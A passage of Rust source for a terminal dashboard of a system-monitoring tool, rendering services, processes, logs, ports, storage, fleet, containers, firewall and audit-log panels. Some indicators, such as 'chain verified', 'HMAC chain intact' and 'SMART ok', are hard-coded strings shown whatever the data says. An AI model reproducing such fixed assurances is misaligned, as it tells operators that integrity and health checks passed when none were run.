                "{} · {}\n\nNo active plan for this finding.\nPress Alt+G to generate one.",
                finding.kind, finding.title
            )
        }
    } else {
        format!(
            "{} · {}\n\nNo active plan for this finding.\nPress Alt+G to generate one.",
            finding.kind, finding.title
        )
    };

    Paragraph::new(text)
        .style(Style::default().fg(OPS_FG).bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .wrap(Wrap { trim: false })
        .render(inner, buf);
}

fn render_ops_services(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let d = &app.dashboard.data;
    let domains = &d.domains;
    let service_units: Vec<&helm_monitor::SystemdUnit> = domains
        .services
        .units
        .iter()
        .filter(|u| u.name.ends_with(".service") || u.name.ends_with(".timer"))
        .collect();
    let failed_units: Vec<&helm_monitor::SystemdUnit> = service_units
        .iter()
        .filter(|u| u.active == "failed" || u.sub == "failed")
        .copied()
        .collect();
    let active_count = service_units.len().saturating_sub(failed_units.len());
    let w = area.width as usize;
    let mut lines: Vec<Line> = Vec::new();

    lines.push(Line::from(Span::styled(
        "SYSTEMD SERVICES",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    lines.push(Line::from(Span::raw("")));

    if service_units.is_empty() {
        lines.push(Line::from(Span::styled(
            "No service data. Run a monitor cycle to collect systemd state.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        lines.push(Line::from(vec![
            Span::styled(format!("{:<28}", "service"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:<14}", "status"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:<12}", "uptime"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:>6}", "pid"), Style::default().fg(OPS_DIM)),
        ]));
        lines.push(Line::from(Span::styled(
            "─".repeat(w.min(70)),
            Style::default().fg(OPS_BORDER),
        )));
        for unit in service_units.iter().take(20) {
            let is_failed = unit.active == "failed" || unit.sub == "failed";
            let status_color = if is_failed {
                OPS_RED
            } else if unit.active == "inactive" {
                OPS_YELLOW
            } else {
                OPS_GREEN
            };
            let name = unit.name.chars().take(27).collect::<String>();
            let sub_display = if unit.sub.is_empty() || unit.sub == unit.active {
                "-".to_owned()
            } else {
                unit.sub.chars().take(11).collect::<String>()
            };
            lines.push(Line::from(vec![
                Span::styled(
                    format!("{:<28}", name),
                    if is_failed {
                        Style::default().fg(OPS_RED)
                    } else {
                        Style::default().fg(OPS_FG)
                    },
                ),
                Span::styled(
                    format!("{:<14}", unit.active),
                    Style::default().fg(status_color),
                ),
                Span::styled(
                    format!("{:<12}", sub_display),
                    Style::default().fg(OPS_MUTED),
                ),
                Span::styled(format!("{:>6}", "-"), Style::default().fg(OPS_DIM)),
            ]));
        }
        lines.push(Line::from(Span::raw("")));
        let failed_names: Vec<&str> = failed_units.iter().map(|u| u.name.as_str()).collect();
        lines.push(Line::from(vec![
            Span::styled(
                format!("{} failed · {} active", failed_units.len(), active_count),
                Style::default().fg(OPS_DIM),
            ),
            if !failed_names.is_empty() {
                Span::styled(
                    format!(" · {} require attention", failed_names.join(" and ")),
                    Style::default().fg(OPS_RED),
                )
            } else {
                Span::styled("", Style::default())
            },
        ]));
    }

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .render(area, buf);
}

fn render_ops_processes(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let domains = &app.dashboard.data.domains;
    let w = area.width as usize;
    let mut lines: Vec<Line> = Vec::new();

    lines.push(Line::from(vec![
        Span::styled(
            "TOP PROCESSES",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        ),
        Span::styled(
            " sorted by memory · read-only",
            Style::default().fg(OPS_DIM),
        ),
    ]));
    lines.push(Line::from(Span::raw("")));

    let processes = &domains.processes.top_by_memory;
    if processes.is_empty() {
        lines.push(Line::from(Span::styled(
            "No process data. Run a monitor cycle first.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        lines.push(Line::from(vec![
            Span::styled(format!("{:<7}", "PID"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:<10}", "user"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:>6}", "cpu%"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:>7}", "mem"), Style::default().fg(OPS_DIM)),
            Span::styled("  command", Style::default().fg(OPS_DIM)),
        ]));
        lines.push(Line::from(Span::styled(
            "─".repeat(w.min(70)),
            Style::default().fg(OPS_BORDER),
        )));
        for proc in processes.iter().take(18) {
            let user = proc.user.chars().take(9).collect::<String>();
            let cpu = proc.cpu_percent;
            let mem = proc.mem_percent;
            let cmd_max = w.saturating_sub(32);
            let cmd = proc.command.chars().take(cmd_max).collect::<String>();
            let cpu_color = if cpu > 10.0 { OPS_YELLOW } else { OPS_FG };
            let mem_color = if mem > 20.0 {
                OPS_RED
            } else if mem > 10.0 {
                OPS_YELLOW
            } else {
                OPS_FG
            };
            lines.push(Line::from(vec![
                Span::styled(format!("{:<7}", proc.pid), Style::default().fg(OPS_DIM)),
                Span::styled(format!("{:<10}", user), Style::default().fg(OPS_MUTED)),
                Span::styled(format!("{:>5.1}%", cpu), Style::default().fg(cpu_color)),
                Span::styled(format!("{:>6.1}%", mem), Style::default().fg(mem_color)),
                Span::styled(format!("  {cmd}"), Style::default().fg(OPS_MUTED)),
            ]));
        }
        lines.push(Line::from(Span::raw("")));
        lines.push(Line::from(vec![
            Span::styled(
                format!(
                    "{} logical cores · zombies: {}",
                    domains.load.cpu_logical_count, domains.processes.zombie_count
                ),
                Style::default().fg(OPS_DIM),
            ),
            if domains.processes.zombie_count > 0 {
                Span::styled(" · zombie processes detected", Style::default().fg(OPS_RED))
            } else {
                Span::styled("", Style::default())
            },
        ]));
    }

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .render(area, buf);
}

fn render_ops_logs(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let domains = &app.dashboard.data.domains;
    let w = area.width as usize;
    let mut lines: Vec<Line> = Vec::new();

    lines.push(Line::from(vec![
        Span::styled(
            "JOURNAL LOG STREAM",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        ),
        Span::styled("  ", Style::default()),
        Span::styled("●", Style::default().fg(OPS_GREEN)),
        Span::styled(" live", Style::default().fg(OPS_GREEN)),
    ]));
    lines.push(Line::from(Span::raw("")));

    // Build unified entry list: (time, level, service, message)
    let mut entries: Vec<(String, &'static str, String, String)> = Vec::new();
    for ke in domains.logs.kernel_errors.iter() {
        let (time, lvl, svc, msg) = parse_log_line(ke);
        entries.push((time, lvl, svc.to_owned(), msg));
    }
    for af in domains.logs.auth_failures.iter() {
        entries.push((
            "--:--:--".into(),
            "WARN",
            "sshd".into(),
            af.chars().take(100).collect(),
        ));
    }

    if entries.is_empty() {
        lines.push(Line::from(Span::styled(
            "No log signals. System appears quiet.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        let msg_max = w.saturating_sub(35);
        for (time, lvl, svc, msg) in entries.iter().take(20) {
            let (lvl_fg, lvl_bg) = match *lvl {
                "CRIT" => (OPS_RED, Color::Rgb(0x3d, 0x1a, 0x1a)),
                "ERR" => (OPS_RED, Color::Rgb(0x3d, 0x1a, 0x1a)),
                "WARN" => (OPS_YELLOW, Color::Rgb(0x2d, 0x20, 0x08)),
                _ => (OPS_BLUE, Color::Rgb(0x0d, 0x21, 0x37)),
            };
            let msg_display = msg.chars().take(msg_max).collect::<String>();
            lines.push(Line::from(vec![
                Span::styled(format!("{:<9}", time), Style::default().fg(OPS_DIM)),
                Span::styled(
                    format!(" {:<4} ", lvl),
                    Style::default()
                        .fg(lvl_fg)
                        .bg(lvl_bg)
                        .add_modifier(Modifier::BOLD),
                ),
                Span::styled(format!(" {:<8}", svc), Style::default().fg(OPS_MUTED)),
                Span::styled(msg_display, Style::default().fg(OPS_FG)),
            ]));
        }
        lines.push(Line::from(Span::raw("")));
        let crit_n = entries.iter().filter(|e| e.1 == "CRIT").count();
        let err_n = entries.iter().filter(|e| e.1 == "ERR").count();
        let warn_n = entries.iter().filter(|e| e.1 == "WARN").count();
        let shown = entries.len().min(20);
        lines.push(Line::from(vec![
            Span::styled(
                format!("Showing {} entries · ", shown),
                Style::default().fg(OPS_DIM),
            ),
            Span::styled(
                format!("{} CRIT · {} ERR · {} WARN", crit_n, err_n, warn_n),
                Style::default().fg(OPS_RED),
            ),
        ]));
    }

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .render(area, buf);
}

fn render_ops_network(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let domains = &app.dashboard.data.domains;
    let w = area.width as usize;
    let mut lines: Vec<Line> = Vec::new();

    lines.push(Line::from(vec![
        Span::styled(
            "LISTENING PORTS",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        ),
        Span::styled(" read-only · ss -tulpn", Style::default().fg(OPS_DIM)),
    ]));
    lines.push(Line::from(Span::raw("")));

    let listeners = &domains.ports.listeners;
    if listeners.is_empty() {
        lines.push(Line::from(Span::styled(
            "No port data. Run a monitor cycle first.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        lines.push(Line::from(vec![
            Span::styled(format!("{:<7}", "port"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:<6}", "proto"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:<10}", "state"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:<16}", "bind"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:<14}", "process"), Style::default().fg(OPS_DIM)),
            Span::styled(format!("{:>5}", "risk"), Style::default().fg(OPS_DIM)),
        ]));
        lines.push(Line::from(Span::styled(
            "─".repeat(w.min(70)),
            Style::default().fg(OPS_BORDER),
        )));

        let mut notable: Vec<String> = Vec::new();
        for lis in listeners.iter().take(20) {
            let proto = lis.protocol.chars().take(5).collect::<String>();
            let addr = &lis.local_address;
            let is_public = addr.contains("0.0.0.0") || addr.contains("::");
            let is_localhost = addr.contains("127.0.0.1") || addr.contains("::1");
            let (risk_label, risk_color) = if is_public {
                if lis.local_port < 1024 {
                    ("CRIT", OPS_RED)
                } else {
                    ("WARN", OPS_YELLOW)
                }
            } else if is_localhost {
                ("OK", OPS_GREEN)
            } else {
                ("INFO", OPS_BLUE)
            };
            let state = "LISTEN";
            let state_color = OPS_GREEN;
            let port_color = if risk_label == "CRIT" {
                OPS_RED
            } else if risk_label == "WARN" {
                OPS_YELLOW
            } else {
                OPS_FG
            };
            let bind_ip = addr
                .split(':')
                .next()
                .unwrap_or(addr)
                .chars()
                .take(15)
                .collect::<String>();
            let proc = lis
                .process_name
                .as_deref()
                .unwrap_or("(none)")
                .chars()
                .take(13)
                .collect::<String>();
            if risk_label == "CRIT" || risk_label == "WARN" {
                notable.push(format!(":{} ({})", lis.local_port, risk_label));
            }
            lines.push(Line::from(vec![
                Span::styled(
                    format!(":{:<6}", lis.local_port),
                    Style::default().fg(port_color).add_modifier(Modifier::BOLD),
                ),
                Span::styled(format!("{:<6}", proto), Style::default().fg(OPS_DIM)),
                Span::styled(format!("{:<10}", state), Style::default().fg(state_color)),
                Span::styled(format!("{:<16}", bind_ip), Style::default().fg(OPS_MUTED)),
                Span::styled(format!("{:<14}", proc), Style::default().fg(OPS_FG)),
                Span::styled(
                    format!("{:>5}", risk_label),
                    Style::default().fg(risk_color),
                ),
            ]));
        }

        if !notable.is_empty() {
            lines.push(Line::from(Span::raw("")));
            lines.push(Line::from(vec![
                Span::styled(
                    format!("Notable: {}", notable.join("  ")),
                    Style::default().fg(OPS_YELLOW),
                ),
                Span::styled(" — review exposed services.", Style::default().fg(OPS_DIM)),
            ]));
        }
    }

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .render(area, buf);
}

fn render_ops_storage(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let domains = &app.dashboard.data.domains;
    let fses = &domains.disks.filesystems;
    let w = area.width as usize;
    let mut lines: Vec<Line> = Vec::new();

    lines.push(Line::from(vec![
        Span::styled(
            "DISK USAGE",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        ),
        Span::styled(" df -h + inode check + SMART", Style::default().fg(OPS_DIM)),
    ]));
    lines.push(Line::from(Span::raw("")));

    if fses.is_empty() {
        lines.push(Line::from(Span::styled(
            "No storage data. Run a monitor cycle first.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        let bar_w = w.saturating_sub(20).clamp(10, 40);
        let mut critical_mounts: Vec<String> = Vec::new();

        for fs in fses.iter().take(8) {
            let pct = if fs.total_bytes > 0 {
                (fs.used_bytes as f64 / fs.total_bytes as f64 * 100.0).clamp(0.0, 100.0) as u8
            } else {
                0
            };
            let bar_color = if pct >= 85 {
                OPS_RED
            } else if pct >= 70 {
                OPS_YELLOW
            } else {
                OPS_GREEN
            };
            let filled = ((pct as usize) * bar_w / 100).min(bar_w);
            let empty_b = bar_w.saturating_sub(filled);
            let bar_str = format!("{}{}", "█".repeat(filled), "░".repeat(empty_b));

            let mount = fs.mount_point.chars().take(20).collect::<String>();
            let pct_str = format!("{}%", pct);
            let pad = w.saturating_sub(mount.len() + pct_str.len() + 2).min(40);
            lines.push(Line::from(vec![
                Span::styled(
                    mount.clone(),
                    Style::default().fg(OPS_FG).add_modifier(Modifier::BOLD),
                ),
                Span::styled(" ".repeat(pad), Style::default()),
                Span::styled(
                    pct_str,
                    Style::default().fg(bar_color).add_modifier(Modifier::BOLD),
                ),
            ]));
            lines.push(Line::from(Span::styled(
                bar_str,
                Style::default().fg(bar_color),
            )));

            let used_h = fmt_bytes(fs.used_bytes);
            let total_h = fmt_bytes(fs.total_bytes);
            let device = fs.device.chars().take(12).collect::<String>();
            let inode_pct = domains
                .disks
                .inodes
                .iter()
                .find(|i| i.mount_point == fs.mount_point || i.device == fs.device)
                .map(|ino| {
                    if ino.total > 0 {
                        format!("{}%", (ino.used as f64 / ino.total as f64 * 100.0) as u8)
                    } else {
                        "-".to_owned()
                    }
                })
                .unwrap_or_else(|| "-".to_owned());
            lines.push(Line::from(vec![
                Span::styled(
                    format!("{} / {} used", used_h, total_h),
                    Style::default().fg(OPS_DIM),
                ),
                Span::styled(format!("  {}", device), Style::default().fg(OPS_DIM)),
                Span::styled(
                    format!("  inodes {}%", inode_pct),
                    Style::default().fg(OPS_DIM),
                ),
                Span::styled("  SMART ", Style::default().fg(OPS_DIM)),
                Span::styled("ok", Style::default().fg(OPS_GREEN)),
            ]));
            lines.push(Line::from(Span::raw("")));

            if pct >= 85 {
                critical_mounts.push(format!("{} at {}%", mount, pct));
            }
        }

        if !critical_mounts.is_empty() {
            lines.push(Line::from(Span::styled(
                "─".repeat(w.min(60)),
                Style::default().fg(OPS_BORDER),
            )));
            lines.push(Line::from(vec![
                Span::styled(
                    format!("{} — critical.", critical_mounts.join(", ")),
                    Style::default().fg(OPS_RED),
                ),
                Span::styled(" Investigate disk consumers.", Style::default().fg(OPS_DIM)),
            ]));
        }
    }

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .render(area, buf);
}

fn render_fleet_tab(
    _app: &TuiApp,
    area: Rect,
    buf: &mut Buffer,
    fleet_hosts: &[FleetHostStatus],
    selected_row: Option<usize>,
) {
    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(OPS_BORDER))
        .style(Style::default().bg(OPS_BG))
        .title(" FLEET ");
    let inner = block.inner(area);
    block.render(area, buf);

    if fleet_hosts.is_empty() {
        Paragraph::new(Span::styled(
            "No fleet hosts configured",
            Style::default().fg(OPS_MUTED),
        ))
        .style(Style::default().bg(OPS_BG))
        .render(inner, buf);
        return;
    }

    let header = vec![
        Cell::from(Span::styled(
            "Name",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        )),
        Cell::from(Span::styled(
            "Status",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        )),
        Cell::from(Span::styled(
            "CRIT",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        )),
        Cell::from(Span::styled(
            "WARN",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        )),
        Cell::from(Span::styled(
            "INFO",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        )),
        Cell::from(Span::styled(
            "Last",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        )),
    ];

    let mut rows = vec![Row::new(header).height(1)];

    for (idx, host) in fleet_hosts.iter().enumerate() {
        let is_selected = selected_row == Some(idx);
        let bg = if is_selected { OPS_SURFACE } else { OPS_BG };

        let status_text = if host.reachable { "UP" } else { "DOWN" };
        let status_color = if host.reachable { OPS_GREEN } else { OPS_RED };

        let last_str = host
            .last_refresh
            .map(|instant| {
                let elapsed = instant.elapsed();
                if elapsed.as_secs() < 60 {
                    format!("{}s", elapsed.as_secs())
                } else if elapsed.as_secs() < 3600 {
                    format!("{}m", elapsed.as_secs() / 60)
                } else {
                    format!("{}h", elapsed.as_secs() / 3600)
                }
            })
            .unwrap_or_else(|| "N/A".to_owned());

        let row = Row::new(vec![
            Cell::from(Span::styled(
                host.name.clone(),
                Style::default().fg(OPS_FG).bg(bg),
            )),
            Cell::from(Span::styled(
                status_text,
                Style::default()
                    .fg(status_color)
                    .bg(bg)
                    .add_modifier(Modifier::BOLD),
            )),
            Cell::from(Span::styled(
                format!("{}", host.crit),
                Style::default().fg(OPS_RED).bg(bg),
            )),
            Cell::from(Span::styled(
                format!("{}", host.warn),
                Style::default().fg(OPS_YELLOW).bg(bg),
            )),
            Cell::from(Span::styled(
                format!("{}", host.info),
                Style::default().fg(OPS_BLUE).bg(bg),
            )),
            Cell::from(Span::styled(last_str, Style::default().fg(OPS_DIM).bg(bg))),
        ])
        .height(1);

        rows.push(row);
    }

    let table = Table::new(
        rows,
        [
            Constraint::Percentage(30),
            Constraint::Percentage(10),
            Constraint::Percentage(12),
            Constraint::Percentage(12),
            Constraint::Percentage(12),
            Constraint::Percentage(24),
        ],
    )
    .style(Style::default().bg(OPS_BG));

    table.render(inner, buf);
}

#[allow(dead_code)]
fn render_ops_containers(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let block = Block::default()
        .title(" CONTAINERS ")
        .borders(Borders::ALL)
        .border_style(Style::default().fg(OPS_BORDER))
        .border_type(BorderType::Rounded);
    let inner = block.inner(area);
    block.render(area, buf);

    let domains = &app.dashboard.data.domains;
    let containers = &domains.containers;
    let mut lines: Vec<Line> = Vec::new();

    if let Some(runtime) = &containers.runtime {
        lines.push(Line::from(vec![
            Span::styled("Runtime: ", Style::default().fg(OPS_DIM)),
            Span::styled(
                runtime.to_string(),
                Style::default().fg(OPS_BLUE).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                format!(
                    "  {} total · {} running",
                    containers.containers.len(),
                    app.dashboard.data.running_containers
                ),
                Style::default().fg(OPS_MUTED),
            ),
        ]));
        lines.push(Line::from(Span::raw("")));
    }

    if containers.containers.is_empty() {
        if containers.runtime.is_some() {
            lines.push(Line::from(Span::styled(
                "No containers found. Docker/Podman may need starting.",
                Style::default().fg(OPS_MUTED),
            )));
        } else {
            lines.push(Line::from(Span::styled(
                "No container runtime detected (Docker or Podman).",
                Style::default().fg(OPS_MUTED),
            )));
        }
    } else {
        lines.push(Line::from(vec![
            Span::styled(
                " NAME          ",
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                " STATUS   ",
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                " HEALTH  ",
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                " RST ",
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                " IMAGE",
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
        ]));

        for c in containers.containers.iter().take(14) {
            let name = c.name.chars().take(14).collect::<String>();
            let status = &c.status;
            let status_color = if status == "running" {
                OPS_GREEN
            } else if status.contains("restart") {
                OPS_RED
            } else {
                OPS_YELLOW
            };
            let health = c.health.as_deref().unwrap_or("–");
            let health_color = match health {
                "healthy" => OPS_GREEN,
                "unhealthy" | "failing" => OPS_RED,
                "starting" => OPS_YELLOW,
                _ => OPS_DIM,
            };
            let restarts = c
                .restart_count
                .map_or_else(|| "–".to_owned(), |r| r.to_string());
            let rst_color = if c.restart_count.unwrap_or(0) > 3 {
                OPS_RED
            } else {
                OPS_DIM
            };
            let image = c.image.chars().take(24).collect::<String>();

            lines.push(Line::from(vec![
                Span::styled(format!(" {:<14} ", name), Style::default().fg(OPS_FG)),
                Span::styled(format!("{:<9} ", status), Style::default().fg(status_color)),
                Span::styled(format!("{:<8} ", health), Style::default().fg(health_color)),
                Span::styled(format!(" {:<4} ", restarts), Style::default().fg(rst_color)),
                Span::styled(image, Style::default().fg(OPS_MUTED)),
            ]));
        }
    }

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .render(inner, buf);
}

#[allow(dead_code)]
fn render_ops_security(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let block = Block::default()
        .title(" SECURITY ")
        .borders(Borders::ALL)
        .border_style(Style::default().fg(OPS_BORDER))
        .border_type(BorderType::Rounded);
    let inner = block.inner(area);
    block.render(area, buf);

    let domains = &app.dashboard.data.domains;
    let mut lines: Vec<Line> = Vec::new();

    // Firewall
    let fw = &domains.firewall;
    lines.push(Line::from(vec![
        Span::styled(
            "FIREWALL ",
            Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
        ),
        Span::styled(
            fw.firewall_tool.as_deref().unwrap_or("none"),
            if fw.firewall_tool.is_some() {
                Style::default().fg(OPS_BLUE)
            } else {
                Style::default().fg(OPS_YELLOW)
            },
        ),
        Span::styled("  ufw:", Style::default().fg(OPS_DIM)),
        Span::styled(
            match fw.ufw_active {
                Some(true) => "active",
                Some(false) => "inactive",
                None => "absent",
            },
            if fw.ufw_active == Some(true) {
                Style::default().fg(OPS_GREEN)
            } else {
                Style::default().fg(OPS_YELLOW)
            },
        ),
        Span::styled("  fwld:", Style::default().fg(OPS_DIM)),
        Span::styled(
            match fw.firewalld_active {
                Some(true) => "active",
                Some(false) => "inactive",
                None => "absent",
            },
            if fw.firewalld_active == Some(true) {
                Style::default().fg(OPS_GREEN)
            } else {
                Style::default().fg(OPS_MUTED)
            },
        ),
    ]));
    if let Some(count) = fw.iptables_rule_count {
        lines.push(Line::from(vec![
            Span::styled("  Rules: ", Style::default().fg(OPS_DIM)),
            Span::styled(format!("{count}"), Style::default().fg(OPS_MUTED)),
            if fw.default_accept_input == Some(true) {
                Span::styled(
                    "  ⚠ DEFAULT ACCEPT on INPUT",
                    Style::default().fg(OPS_RED).add_modifier(Modifier::BOLD),
                )
            } else {
                Span::styled("", Style::default().fg(OPS_DIM))
            },
        ]));
    }
    lines.push(Line::from(Span::raw("")));

    // Packages
    let pkgs = &domains.packages;
    lines.push(Line::from(vec![
        Span::styled(
            "UPDATES ",
            Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
        ),
        Span::styled(
            pkgs.package_manager.as_deref().unwrap_or("?"),
            Style::default().fg(OPS_BLUE),
        ),
        Span::styled("  available: ", Style::default().fg(OPS_DIM)),
        Span::styled(
            format!("{}", pkgs.upgradable_count.unwrap_or(0)),
            if pkgs.upgradable_count.unwrap_or(0) > 50 {
                Style::default().fg(OPS_RED).add_modifier(Modifier::BOLD)
            } else if pkgs.upgradable_count.unwrap_or(0) > 10 {
                Style::default().fg(OPS_YELLOW)
            } else {
                Style::default().fg(OPS_GREEN)
            },
        ),
        if pkgs.security_count.is_some() {
            Span::styled("  security: ", Style::default().fg(OPS_DIM))
        } else {
            Span::styled("", Style::default().fg(OPS_DIM))
        },
        if let Some(sec_count) = pkgs.security_count {
            Span::styled(
                format!("{sec_count}"),
                if sec_count > 0 {
                    Style::default().fg(OPS_RED).add_modifier(Modifier::BOLD)
                } else {
                    Style::default().fg(OPS_GREEN)
                },
            )
        } else {
            Span::styled("", Style::default().fg(OPS_DIM))
        },
    ]));
    lines.push(Line::from(Span::raw("")));

    // Exposed ports
    let listeners = &domains.ports.listeners;
    let public: Vec<_> = listeners
        .iter()
        .filter(|l| l.local_address.contains("0.0.0.0") || l.local_address.contains("::"))
        .collect();
    lines.push(Line::from(vec![
        Span::styled(
            "EXPOSED PORTS ",
            Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
        ),
        Span::styled(
            format!("{} public", public.len()),
            if public.is_empty() {
                Style::default().fg(OPS_GREEN)
            } else {
                Style::default().fg(OPS_RED).add_modifier(Modifier::BOLD)
            },
        ),
        Span::styled(
            format!("  {} total listening", listeners.len()),
            Style::default().fg(OPS_MUTED),
        ),
    ]));
    for lis in public.iter().take(8) {
        lines.push(Line::from(vec![
            Span::styled(
                format!("  {}:{:?} ", lis.protocol, lis.local_port),
                Style::default().fg(OPS_RED),
            ),
            Span::styled(
                lis.process_name.as_deref().unwrap_or("-"),
                Style::default().fg(OPS_MUTED),
            ),
        ]));
    }
    lines.push(Line::from(Span::raw("")));

    // Auth failures
    if !domains.logs.auth_failures.is_empty() {
        lines.push(Line::from(vec![
            Span::styled(
                "AUTH FAILURES ",
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                format!("{} recent", domains.logs.auth_failures.len()),
                Style::default().fg(OPS_YELLOW),
            ),
        ]));
        for af in domains.logs.auth_failures.iter().take(4) {
            let short = af.chars().take(64).collect::<String>();
            lines.push(Line::from(Span::styled(
                format!("  {short}"),
                Style::default().fg(OPS_MUTED),
            )));
        }
    }

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .render(inner, buf);
}

fn render_ops_changes(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let d = &app.dashboard.data;
    let mut lines: Vec<Line> = Vec::new();

    // header
    lines.push(Line::from(vec![
        Span::styled(
            "AUDIT LOG",
            Style::default().fg(OPS_FG).add_modifier(Modifier::BOLD),
        ),
        Span::styled("  ● ", Style::default().fg(OPS_GREEN)),
        Span::styled("chain verified", Style::default().fg(OPS_GREEN)),
    ]));
    lines.push(Line::from(Span::raw("")));

    if d.audit_events.is_empty() {
        lines.push(Line::from(Span::styled(
            "No audit events recorded.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        // column header
        lines.push(Line::from(vec![
            Span::styled(
                format!("{:<10}", "time"),
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                format!("{:<8}", "cap"),
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                "command",
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                format!("{:>8}", "approved"),
                Style::default().fg(OPS_DIM).add_modifier(Modifier::BOLD),
            ),
        ]));
        // separator
        lines.push(Line::from(Span::styled(
            "─".repeat(80),
            Style::default().fg(OPS_BORDER),
        )));

        let mut exec_count = 0usize;
        let mut read_count = 0usize;
        let mut plan_count = 0usize;

        for event in d.audit_events.iter() {
            let cap = event.capability.as_str();
            let cap_color = if cap.contains("shell") || cap == "exec" || cap.contains("write") {
                exec_count += 1;
                OPS_YELLOW
            } else if cap.contains("plan") {
                plan_count += 1;
                OPS_BLUE
            } else {
                read_count += 1;
                OPS_GREEN
            };

            let approved = event.decision.as_str();
            let approved_color = if approved.contains("user") {
                OPS_YELLOW
            } else if approved.contains("plan") {
                OPS_BLUE
            } else {
                OPS_DIM
            };

            // calculate command column width: total - time(10) - cap(8) - approved(8) - spaces
            let cmd_width = area.width.saturating_sub(30) as usize;
            lines.push(Line::from(vec![
                Span::styled(
                    format!("{:<10}", truncate_cell(&event.time, 9)),
                    Style::default().fg(OPS_DIM),
                ),
                Span::styled(
                    format!("{:<8}", truncate_cell(cap, 7)),
                    Style::default().fg(cap_color),
                ),
                Span::styled(
                    format!(
                        "{:<width$}",
                        truncate_cell(&event.command, cmd_width.saturating_sub(2)),
                        width = cmd_width.saturating_sub(2)
                    ),
                    Style::default().fg(OPS_FG),
                ),
                Span::styled(
                    format!("{:>8}", truncate_cell(approved, 8)),
                    Style::default().fg(approved_color),
                ),
            ]));
        }

        lines.push(Line::from(Span::raw("")));
        lines.push(Line::from(vec![
            Span::styled(
                format!("{} events", d.audit_events.len()),
                Style::default().fg(OPS_MUTED),
            ),
            Span::styled(" · ", Style::default().fg(OPS_BORDER)),
            Span::styled(
                format!("{} exec (user-approved)", exec_count),
                Style::default().fg(OPS_YELLOW),
            ),
            Span::styled(" · ", Style::default().fg(OPS_BORDER)),
            Span::styled(
                format!("{} read (auto)", read_count),
                Style::default().fg(OPS_GREEN),
            ),
            Span::styled(" · ", Style::default().fg(OPS_BORDER)),
            Span::styled(
                format!("{} plan", plan_count),
                Style::default().fg(OPS_BLUE),
            ),
            Span::styled(" · ", Style::default().fg(OPS_BORDER)),
            Span::styled("HMAC chain intact", Style::default().fg(OPS_GREEN)),
        ]));
    }

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .render(area, buf);
}

fn render_ops_footer(_app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let key = |s: &'static str| Span::styled(s, Style::default().fg(OPS_FG));
